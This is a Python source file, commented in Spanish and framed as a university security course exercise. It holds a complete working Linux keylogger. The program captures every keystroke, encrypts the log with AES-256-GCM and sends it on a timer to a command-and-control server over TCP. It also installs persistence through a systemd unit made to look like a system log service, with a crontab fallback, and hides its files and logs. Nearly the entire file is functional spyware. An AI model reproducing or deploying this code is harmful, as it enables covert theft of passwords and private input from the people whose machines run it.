#!/usr/bin/env python3
"""
=============================================================================
Proyecto Unidad 2 - Seguridad Informática
Ejercicio 1 y 2: Keylogger con Cifrado y Envío Seguro
=============================================================================

Descripción general:
    Este módulo implementa un keylogger para Linux que:
      1. Captura todas las pulsaciones de teclado mediante la librería 'pynput'.
      2. Almacena las teclas en un buffer local temporal (archivo cifrado).
      3. Cifra los datos con AES-256-GCM antes de cualquier transmisión.
      4. Envía periódicamente los datos cifrados al servidor C2 (Command & Control).
      5. Establece persistencia mediante una unidad de systemd o crontab.

Limitaciones conocidas (Análisis Ejercicio 1):
    - Campos de contraseña en navegadores basados en Wayland pueden ser
      capturados, pero en sesiones Wayland puras (sin XWayland), pynput
      con backend X11 no funciona; se requiere backend Wayland alternativo.
    - Algunos terminales en modo raw (vi, nano) envían secuencias de escape
      que son capturadas como teclas especiales, no como el carácter visible.
    - Caracteres generados por métodos de entrada (IME, p.ej. japonés/chino)
      pueden no capturarse correctamente ya que pasan por una capa extra.
    - Eventos de teclado en máquinas virtuales con VirtIO pueden tener latencia
      o pérdidas si el driver no expone los eventos a nivel de /dev/input.

Uso:
    python3 keylogger.py [--interval SEGUNDOS] [--server HOST:PUERTO]

Requerimientos:
    pip install pynput cryptography requests

Autor: Proyecto académico - Entorno controlado virtualizado
=============================================================================
"""

import os
import sys
import time
import socket
import struct
import base64
import logging
import argparse
import threading
import subprocess
from datetime import datetime
from pathlib import Path

# Dependencias de terceros
try:
    from pynput import keyboard
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    import requests
except ImportError as e:
    print(f"[ERROR] Dependencia faltante: {e}")
    print("Instale: pip install pynput cryptography requests")
    sys.exit(1)


# =============================================================================
# CONFIGURACIÓN GLOBAL
# =============================================================================

# Clave maestra derivada mediante PBKDF2 (no embebida directamente).
# En una implementación real, la semilla podría obtenerse dinámicamente
# desde el C2 o derivarse de un identificador único del host.
MASTER_PASSWORD = b"S3guridad_UTalca_2026"  # semilla para derivación de clave
SALT = b"proyect0_keylogger_salt_v1"        # sal fija (conocida por atacante y víctima)
KEY_ITERATIONS = 200_000                    # iteraciones PBKDF2 para dificultar fuerza bruta

# Servidor C2 - ajustar a la IP/puerto del servidor receptor
C2_HOST = "127.0.0.1"   # <-- cambiar a la IP del atacante
C2_PORT = 9999

# Intervalo de envío en segundos (configurable por argumento --interval)
DEFAULT_SEND_INTERVAL = 30  # segundos

# Archivos locales
LOG_DIR = Path.home() / ".local" / "share" / ".syslog_cache"
BUFFER_FILE = LOG_DIR / ".kb_buf.enc"      # buffer cifrado temporal
SENT_LOG    = LOG_DIR / ".kb_sent.log"     # log de transmisiones exitosas

# Nombre del servicio systemd para persistencia
SERVICE_NAME = "syslog-cache.service"


# =============================================================================
# MÓDULO DE CRIPTOGRAFÍA (Ejercicio 2)
# =============================================================================

def derive_key(password: bytes, salt: bytes, iterations: int) -> bytes:
    """
    Deriva una clave AES-256 (32 bytes) a partir de una contraseña maestra
    usando PBKDF2-HMAC-SHA256.

    Justificación del algoritmo:
        - AES-256-GCM es cifrado simétrico autenticado (AEAD), a diferencia de
          funciones hash (MD5, SHA-256) que son unidireccionales y NO permiten
          recuperar el plaintext. MD5 NO es una opción válida de cifrado porque:
            1. Es una función de compresión unidireccional, no reversible.
            2. Está completamente roto para resistencia a colisiones.
            3. No provee confidencialidad: dado el ciphertext, no se puede
               obtener el plaintext con una clave.
        - AES-256-GCM provee:
            * Confidencialidad (nadie sin la clave puede leer los datos).
            * Integridad/Autenticación (el tag GCM detecta manipulaciones).
            * Nonce aleatorio de 12 bytes por mensaje (evita reutilización).

    Gestión de clave:
        - La clave NO está embebida directamente en el ejecutable (evita
          extracción trivial con strings/hexdump).
        - Se deriva en tiempo de ejecución mediante PBKDF2 con 200.000
          iteraciones, lo que hace costoso un ataque de diccionario offline.
        - Implicancia de seguridad: si el ejecutable es analizado estáticamente,
          el atacante ve MASTER_PASSWORD y SALT, pero aún necesita ejecutar
          200.000 iteraciones de SHA-256 para obtener la clave final.

    Args:
        password:   Contraseña/semilla maestra en bytes.
        salt:       Sal criptográfica (debe ser conocida por ambos extremos).
        iterations: Número de iteraciones PBKDF2 (mayor = más seguro y lento).

    Returns:
        bytes: Clave de 32 bytes lista para usar con AES-256.
    """
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,          # 256 bits → AES-256
        salt=salt,
        iterations=iterations,
    )
    return kdf.derive(password)


def encrypt_data(plaintext: bytes, key: bytes) -> bytes:
    """
    Cifra datos usando AES-256-GCM.

    Formato del ciphertext resultante:
        [nonce (12 bytes)] + [ciphertext + tag GCM (variable)]

    El nonce se genera aleatoriamente por os.urandom() en cada llamada,
    garantizando que el mismo plaintext produzca ciphertexts distintos.

    Args:
        plaintext: Datos a cifrar.
        key:       Clave AES-256 de 32 bytes (derivada por derive_key).

    Returns:
        bytes: nonce (12B) || ciphertext_con_tag
    """
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)          # 96 bits, recomendación NIST para GCM
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ciphertext       # prepend nonce para que el receptor pueda descifrar


def decrypt_data(blob: bytes, key: bytes) -> bytes:
    """
    Descifra un blob producido por encrypt_data().

    Args:
        blob: nonce (12B) || ciphertext_con_tag (producido por encrypt_data).
        key:  Clave AES-256 de 32 bytes idéntica a la usada en el cifrado.

    Returns:
        bytes: Datos en claro.

    Raises:
        cryptography.exceptions.InvalidTag: Si el tag GCM no coincide
            (datos manipulados o clave incorrecta).
    """
    aesgcm = AESGCM(key)
    nonce      = blob[:12]
    ciphertext = blob[12:]
    return aesgcm.decrypt(nonce, ciphertext, None)


# =============================================================================
# MÓDULO DE BUFFER LOCAL
# =============================================================================

class SecureBuffer:
    """
    Buffer thread-safe que almacena las pulsaciones en memoria y las
    vuelca periódicamente a disco en forma cifrada.

    El archivo en disco sirve como respaldo: si el proceso muere antes de
    transmitir, los datos no se pierden y se enviarán en la próxima ejecución.
    """

    def __init__(self, key: bytes, buffer_file: Path):
        """
        Args:
            key:         Clave AES-256 para cifrar el buffer en disco.
            buffer_file: Ruta del archivo cifrado temporal.
        """
        self._lock       = threading.Lock()
        self._buffer     = []          # lista de strings (teclas capturadas)
        self._key        = key
        self._buf_file   = buffer_file
        buffer_file.parent.mkdir(parents=True, exist_ok=True)

    def add(self, key_str: str):
        """
        Agrega una tecla/cadena al buffer en memoria.

        Args:
            key_str: Representación en texto de la tecla pulsada.
        """
        with self._lock:
            self._buffer.append(key_str)

    def flush_to_disk(self):
        """
        Vuelca el buffer en memoria al archivo cifrado en disco y limpia el buffer.

        El archivo en disco es un append cifrado: cada volcado agrega un bloque
        independiente (nonce + ciphertext), permitiendo recuperación parcial.
        """
        with self._lock:
            if not self._buffer:
                return
            chunk = "".join(self._buffer).encode("utf-8")
            self._buffer.clear()

        # Cifrar el chunk y añadirlo al archivo (formato: 4B longitud + blob)
        encrypted = encrypt_data(chunk, self._key)
        length    = struct.pack(">I", len(encrypted))   # big-endian uint32
        with open(self._buf_file, "ab") as f:
            f.write(length + encrypted)

    def drain_disk(self) -> bytes | None:
        """
        Lee y descifra todos los bloques del archivo en disco, luego lo elimina.

        Returns:
            bytes: Contenido en claro concatenado, o None si el archivo está vacío/inexistente.
        """
        if not self._buf_file.exists() or self._buf_file.stat().st_size == 0:
            return None

        plaintext_parts = []
        with open(self._buf_file, "rb") as f:
            while True:
                length_bytes = f.read(4)
                if not length_bytes:
                    break
                length  = struct.unpack(">I", length_bytes)[0]
                blob    = f.read(length)
                if len(blob) < length:
                    break  # archivo corrupto / incompleto
                try:
                    plaintext_parts.append(decrypt_data(blob, self._key))
                except Exception:
                    pass   # bloque corrupto, ignorar

        self._buf_file.unlink(missing_ok=True)   # limpiar después de drenar

        if plaintext_parts:
            return b"".join(plaintext_parts)
        return None


# =============================================================================
# MÓDULO DE CAPTURA DE TECLADO (Ejercicio 1)
# =============================================================================

class KeyloggerListener:
    """
    Escucha todos los eventos de teclado usando pynput y los almacena
    en el SecureBuffer.

    Flujo de ejecución:
        1. on_press() se llama cada vez que se presiona una tecla.
        2. La tecla se convierte a string legible (_format_key).
        3. Se agrega al SecureBuffer en memoria.
        4. El hilo de volcado periódico (flush_thread) escribe al disco.
    """

    def __init__(self, buffer: SecureBuffer):
        """
        Args:
            buffer: Instancia de SecureBuffer donde se almacenan las teclas.
        """
        self._buffer   = buffer
        self._listener = None

    def _format_key(self, key) -> str:
        """
        Convierte un objeto Key/KeyCode de pynput a una cadena legible.

        Manejo de casos:
            - Teclas alfanuméricas (KeyCode): se usa key.char directamente.
            - Teclas especiales (Key): se mapean a representaciones descriptivas.
            - Tecla desconocida: se registra como '[UNK]'.

        Args:
            key: Objeto pynput keyboard.Key o keyboard.KeyCode.

        Returns:
            str: Representación textual de la tecla.
        """
        special_map = {
            keyboard.Key.space:     " ",
            keyboard.Key.enter:     "\n",
            keyboard.Key.tab:       "\t",
            keyboard.Key.backspace: "[BS]",
            keyboard.Key.delete:    "[DEL]",
            keyboard.Key.esc:       "[ESC]",
            keyboard.Key.ctrl_l:    "[CTRL]",
            keyboard.Key.ctrl_r:    "[CTRL]",
            keyboard.Key.alt_l:     "[ALT]",
            keyboard.Key.alt_r:     "[ALT]",
            keyboard.Key.shift:     "[SHIFT]",
            keyboard.Key.shift_r:   "[SHIFT]",
            keyboard.Key.caps_lock: "[CAPS]",
            keyboard.Key.up:        "[UP]",
            keyboard.Key.down:      "[DOWN]",
            keyboard.Key.left:      "[LEFT]",
            keyboard.Key.right:     "[RIGHT]",
            keyboard.Key.f1:        "[F1]",
            keyboard.Key.f2:        "[F2]",
            keyboard.Key.f3:        "[F3]",
            keyboard.Key.f4:        "[F4]",
            keyboard.Key.f5:        "[F5]",
            keyboard.Key.f6:        "[F6]",
            keyboard.Key.f7:        "[F7]",
            keyboard.Key.f8:        "[F8]",
            keyboard.Key.f9:        "[F9]",
            keyboard.Key.f10:       "[F10]",
            keyboard.Key.f11:       "[F11]",
            keyboard.Key.f12:       "[F12]",
        }

        if key in special_map:
            return special_map[key]
        try:
            return key.char if key.char is not None else f"[{key}]"
        except AttributeError:
            return f"[UNK:{key}]"

    def on_press(self, key):
        """
        Callback invocado por pynput en cada pulsación de tecla.

        Args:
            key: Objeto de tecla pulsada (keyboard.Key o keyboard.KeyCode).
        """
        formatted = self._format_key(key)
        # Añadir marca de tiempo al inicio de cada línea nueva para contexto
        ts = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        if formatted == "\n":
            self._buffer.add(formatted)
        else:
            self._buffer.add(formatted)

    def start(self):
        """
        Inicia el listener de teclado en un hilo no-bloqueante (daemon).
        pynput crea internamente un hilo que llama a on_press() por cada evento.
        """
        self._listener = keyboard.Listener(on_press=self.on_press)
        self._listener.daemon = True
        self._listener.start()

    def stop(self):
        """Detiene el listener de forma limpia."""
        if self._listener:
            self._listener.stop()


# =============================================================================
# MÓDULO DE TRANSMISIÓN C2 (Ejercicio 2)
# =============================================================================

def send_to_c2(data: bytes, host: str, port: int) -> bool:
    """
    Envía un blob de datos cifrados al servidor C2 mediante un socket TCP.

    Protocolo de envío:
        - Primero se envían 4 bytes (big-endian uint32) indicando la longitud.
        - Luego se envía el blob cifrado completo.
        - El servidor lee exactamente esa cantidad de bytes.

    Nota: Los datos ya vienen cifrados (encrypt_data fue aplicado antes).
    Esta función solo se encarga del transporte.

    Args:
        data: Blob cifrado (nonce + ciphertext + tag) producido por encrypt_data.
        host: Hostname o IP del servidor C2.
        port: Puerto TCP del servidor C2.

    Returns:
        bool: True si la transmisión fue exitosa, False en caso de error.
    """
    try:
        with socket.create_connection((host, port), timeout=10) as sock:
            length = struct.pack(">I", len(data))
            sock.sendall(length + data)
        return True
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        logging.warning(f"[C2] Error de transmisión: {e}")
        return False


# =============================================================================
# MÓDULO DE PERSISTENCIA (Ejercicio 1 - Persistencia)
# =============================================================================

def install_systemd_persistence(script_path: str):
    """
    Instala una unidad de systemd para el usuario actual, de modo que el
    keylogger se ejecute automáticamente en cada inicio de sesión del usuario.

    Mecanismo de persistencia:
        - Se crea ~/.config/systemd/user/syslog-cache.service
        - La unidad usa [Install] WantedBy=default.target, lo que la activa
          para el login del usuario (sin privilegios de root).
        - Se habilita con: systemctl --user enable <service>
        - Al reiniciar, el servicio se inicia automáticamente.

    Ventajas sobre crontab:
        - Reintentos automáticos en caso de fallo (Restart=on-failure).
        - Integración con el journal de systemd (logs más difíciles de detectar
          para usuarios no técnicos).
        - No requiere modificar archivos visibles como /etc/crontab.

    Args:
        script_path: Ruta absoluta al script/ejecutable del keylogger.
    """
    systemd_dir = Path.home() / ".config" / "systemd" / "user"
    systemd_dir.mkdir(parents=True, exist_ok=True)

    service_content = f"""[Unit]
Description=System Log Cache Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path}
Restart=on-failure
RestartSec=5
Environment=DISPLAY=:0
Environment=XAUTHORITY=%h/.Xauthority

[Install]
WantedBy=default.target
"""
    service_file = systemd_dir / SERVICE_NAME
    service_file.write_text(service_content)

    # Habilitar el servicio (crea el symlink en default.target.wants/)
    try:
        subprocess.run(
            ["systemctl", "--user", "enable", SERVICE_NAME],
            check=True, capture_output=True
        )
        subprocess.run(
            ["systemctl", "--user", "daemon-reload"],
            check=True, capture_output=True
        )
        logging.info(f"[PERSISTENCE] Servicio systemd '{SERVICE_NAME}' instalado y habilitado.")
    except subprocess.CalledProcessError as e:
        logging.warning(f"[PERSISTENCE] No se pudo habilitar systemd: {e}. Intentando crontab...")
        _install_crontab_persistence(script_path)


def _install_crontab_persistence(script_path: str):
    """
    Alternativa de persistencia mediante crontab, usada si systemd no está
    disponible (p.ej. en contenedores Docker o sistemas sin systemd).

    La entrada @reboot ejecuta el comando una vez al iniciar el sistema.

    Args:
        script_path: Ruta absoluta al ejecutable.
    """
    cron_entry = f"@reboot {sys.executable} {script_path} >> /dev/null 2>&1\n"
    try:
        # Leer el crontab actual del usuario
        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        existing = result.stdout if result.returncode == 0 else ""

        # Evitar duplicados
        if script_path not in existing:
            new_crontab = existing + cron_entry
            proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
            proc.communicate(new_crontab.encode())
            logging.info("[PERSISTENCE] Entrada crontab @reboot instalada.")
    except Exception as e:
        logging.warning(f"[PERSISTENCE] Error instalando crontab: {e}")


def check_already_running() -> bool:
    """
    Verifica si ya existe una instancia del keylogger en ejecución,
    evitando múltiples instancias paralelas (p.ej. tras reinicio con servicio activo).

    Usa un archivo PID lock en /tmp para el chequeo.

    Returns:
        bool: True si ya hay otra instancia corriendo, False en caso contrario.
    """
    pid_file = Path("/tmp/.syslogd.pid")
    if pid_file.exists():
        try:
            old_pid = int(pid_file.read_text().strip())
            # Verificar si el proceso con ese PID existe
            os.kill(old_pid, 0)   # señal 0 = solo verificar existencia
            return True           # proceso existe → ya está corriendo
        except (ProcessLookupError, ValueError):
            pass   # proceso muerto → continuar
    pid_file.write_text(str(os.getpid()))
    return False


# =============================================================================
# HILO DE ENVÍO PERIÓDICO (Ejercicio 2 - Envío periódico)
# =============================================================================

class PeriodicSender(threading.Thread):
    """
    Hilo daemon que cada `interval` segundos:
        1. Vuelca el buffer en memoria al disco (flush_to_disk).
        2. Lee y descifra todos los bloques del disco (drain_disk).
        3. Re-cifra el contenido como un único blob para transmisión.
        4. Envía el blob al servidor C2 (send_to_c2).
        5. Registra el resultado en SENT_LOG.

    Flujo: captura → buffer en memoria → disco cifrado → re-cifrado → TCP → C2

    El intervalo de envío es configurable mediante el argumento --interval.
    """

    def __init__(self, buffer: SecureBuffer, key: bytes, host: str, port: int, interval: int):
        """
        Args:
            buffer:   Buffer seguro compartido con el KeyloggerListener.
            key:      Clave AES-256 para cifrar datos antes de enviar.
            host:     Hostname/IP del servidor C2.
            port:     Puerto TCP del servidor C2.
            interval: Segundos entre cada envío.
        """
        super().__init__(daemon=True, name="PeriodicSender")
        self._buffer   = buffer
        self._key      = key
        self._host     = host
        self._port     = port
        self._interval = interval
        self._stop_evt = threading.Event()

    def run(self):
        """
        Bucle principal del hilo. Se ejecuta hasta que se llame a stop().
        Espera `interval` segundos entre iteraciones usando Event.wait()
        para permitir una parada limpia.
        """
        logging.info(f"[SENDER] Iniciado. Intervalo de envío: {self._interval}s → {self._host}:{self._port}")
        while not self._stop_evt.wait(self._interval):
            self._do_send_cycle()

    def _do_send_cycle(self):
        """
        Ejecuta un ciclo completo de recolección y envío:
            1. Flush del buffer en memoria → disco.
            2. Drenado del disco → bytes en claro.
            3. Cifrado del payload.
            4. Transmisión TCP al C2.
            5. Log del resultado.
        """
        # Paso 1: Vaciar buffer en memoria al disco cifrado
        self._buffer.flush_to_disk()

        # Paso 2: Leer todo lo que hay en disco
        payload_plain = self._buffer.drain_disk()
        if not payload_plain:
            return   # nada que enviar

        # Paso 3: Preparar mensaje con metadatos y cifrar
        hostname  = socket.gethostname()
        timestamp = datetime.now().isoformat()
        metadata  = f"[HOST:{hostname}][TIME:{timestamp}]\n".encode("utf-8")
        full_msg  = metadata + payload_plain

        encrypted = encrypt_data(full_msg, self._key)

        # Paso 4: Enviar al C2
        success = send_to_c2(encrypted, self._host, self._port)

        # Paso 5: Registrar resultado
        status = "OK" if success else "FAIL"
        log_line = f"{timestamp} | {status} | {len(encrypted)} bytes\n"
        with open(SENT_LOG, "a") as f:
            f.write(log_line)

        if not success:
            # Si falló la transmisión, guardar de vuelta en disco para no perder datos
            logging.warning("[SENDER] Transmisión fallida. Guardando payload para próximo ciclo.")
            enc_backup = encrypt_data(payload_plain, self._key)
            length = struct.pack(">I", len(enc_backup))
            with open(self._buffer._buf_file, "ab") as f:
                f.write(length + enc_backup)

    def stop(self):
        """Señala al hilo que debe detenerse en la próxima iteración."""
        self._stop_evt.set()


# =============================================================================
# PUNTO DE ENTRADA PRINCIPAL
# =============================================================================

def parse_args() -> argparse.Namespace:
    """
    Analiza los argumentos de línea de comandos.

    Returns:
        argparse.Namespace: Objeto con los argumentos parseados.
    """
    parser = argparse.ArgumentParser(
        description="Keylogger - Proyecto Unidad 2 Seguridad Informática"
    )
    parser.add_argument(
        "--interval",
        type=int,
        default=DEFAULT_SEND_INTERVAL,
        help=f"Intervalo de envío en segundos (default: {DEFAULT_SEND_INTERVAL})"
    )
    parser.add_argument(
        "--server",
        type=str,
        default=f"{C2_HOST}:{C2_PORT}",
        help=f"Servidor C2 en formato HOST:PUERTO (default: {C2_HOST}:{C2_PORT})"
    )
    parser.add_argument(
        "--install",
        action="store_true",
        help="Instalar persistencia mediante systemd y salir"
    )
    parser.add_argument(
        "--no-persist",
        action="store_true",
        help="Ejecutar sin instalar persistencia"
    )
    return parser.parse_args()


def main():
    """
    Función principal que orquesta todos los componentes:
        1. Parsea argumentos y configura logging.
        2. Verifica que no haya otra instancia corriendo.
        3. Deriva la clave AES-256 mediante PBKDF2.
        4. Inicializa el SecureBuffer.
        5. Instala persistencia (systemd/crontab) si se solicita.
        6. Inicia el KeyloggerListener (captura de teclado).
        7. Inicia el PeriodicSender (envío periódico cifrado).
        8. Mantiene el proceso vivo hasta recibir Ctrl+C.
        9. Limpieza ordenada al finalizar.
    """
    args = parse_args()

    # Configurar logging (a archivo oculto para no ser detectado fácilmente)
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    logging.basicConfig(
        filename=str(LOG_DIR / ".debug.log"),
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )

    # Parsear host:puerto del servidor C2
    try:
        host, port_str = args.server.rsplit(":", 1)
        port = int(port_str)
    except ValueError:
        logging.error(f"Formato de servidor inválido: {args.server} (esperado HOST:PUERTO)")
        sys.exit(1)

    # Verificar instancia única
    if check_already_running():
        logging.warning("[MAIN] Ya hay una instancia corriendo. Saliendo.")
        sys.exit(0)

    # ---- Fase 1: Derivación de clave ----
    logging.info("[MAIN] Derivando clave AES-256 con PBKDF2-HMAC-SHA256...")
    aes_key = derive_key(MASTER_PASSWORD, SALT, KEY_ITERATIONS)
    logging.info("[MAIN] Clave derivada correctamente.")

    # ---- Fase 2: Buffer seguro ----
    secure_buf = SecureBuffer(key=aes_key, buffer_file=BUFFER_FILE)

    # ---- Fase 3: Persistencia ----
    if args.install:
        script_path = os.path.abspath(__file__)
        install_systemd_persistence(script_path)
        print(f"[+] Persistencia instalada: {SERVICE_NAME}")
        sys.exit(0)

    if not args.no_persist:
        script_path = os.path.abspath(__file__)
        install_systemd_persistence(script_path)

    # ---- Fase 4: Listener de teclado ----
    listener = KeyloggerListener(buffer=secure_buf)
    listener.start()
    logging.info("[MAIN] KeyloggerListener iniciado.")

    # ---- Fase 5: Hilo de envío periódico ----
    sender = PeriodicSender(
        buffer   = secure_buf,
        key      = aes_key,
        host     = host,
        port     = port,
        interval = args.interval
    )
    sender.start()

    logging.info(f"[MAIN] Sistema activo. Capturando teclado. Intervalo de envío: {args.interval}s")

    # ---- Fase 6: Bucle principal ----
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("[MAIN] Señal de interrupción recibida. Cerrando...")
    finally:
        sender.stop()
        listener.stop()
        # Último flush antes de cerrar
        secure_buf.flush_to_disk()
        logging.info("[MAIN] Keylogger detenido.")
        # Limpiar PID file
        Path("/tmp/.syslogd.pid").unlink(missing_ok=True)


if __name__ == "__main__":
    main()
